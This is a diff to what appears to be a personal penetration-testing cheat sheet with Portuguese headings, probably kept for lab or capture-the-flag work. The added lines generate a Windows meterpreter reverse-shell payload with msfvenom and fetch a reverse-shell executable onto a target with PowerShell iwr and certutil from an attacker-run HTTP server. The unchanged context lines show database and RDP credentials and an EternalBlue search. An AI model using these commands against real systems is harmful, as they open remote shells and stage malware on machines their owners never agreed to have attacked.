@@ -596,6 +596,11 @@ define('DB_PASSWORD', 'LittleYellowLamp90!@');
 
 ```
 
+# msfvenom (preencher/falta fazer)
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.1.222 LPORT=1337 -f exe -o payload.exe
+```
+
 # msfconsole
 ```
 search eternalblue
@@ -725,6 +730,25 @@ xfreerdp /v:10.10.39.3 /u:Administrator /p:letmein123!
 ```
 
 
+# powershell
+transferencia do arquivo rev
+```
+iwr -uri http://<meu_ip>:PORT/rev.exe -outfile rev.exe
+```
+executar antes
+```
+python3 -m http.server <PORT>
+```
+
+# cmd
+transferencia do arquivo rev
+```
+certutil.exe -urlcache -split -f "http://<meu_ip>:PORT/rev.exe"
+```
+executar antes
+```
+python3 -m http.server <PORT>
+```
 
 
 ## login
